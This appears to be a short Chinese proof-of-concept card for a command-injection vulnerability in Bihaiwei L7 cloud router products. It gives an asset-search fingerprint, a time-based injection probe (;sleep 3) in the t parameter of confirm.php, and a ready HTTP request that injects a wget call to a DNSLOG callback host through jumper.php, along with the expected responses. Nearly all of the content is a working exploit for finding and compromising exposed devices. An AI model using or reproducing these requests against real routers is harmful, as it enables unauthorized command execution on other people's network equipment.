# 碧海威L7多款产品confirm存在命令执行漏洞

- **系统**：碧海威L7多款产品　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`product="碧海威科技-L7云路由"`
- **请求**：`GET /notice/confirm.php?t=;sleep%203 HTTP/1.1`
- **关键头**：`Cookie: SESSID=e2cc8cfb14aa1d77ffcfc93204a1d57b`　`Sec-Fetch-User: ?1`

**请求体 / payload**
```
GET /notice/jumper.php?t=;wget%20tadayzkvfq.dgrh3.cn HTTP/1.1
Host:
Cookie: SESSID=e2cc8cfb14aa1d77ffcfc93204a1d57b
Sec-Fetch-User: ?1
```
- **预期**：200　|　响应时间>=3s、DNSLOG回显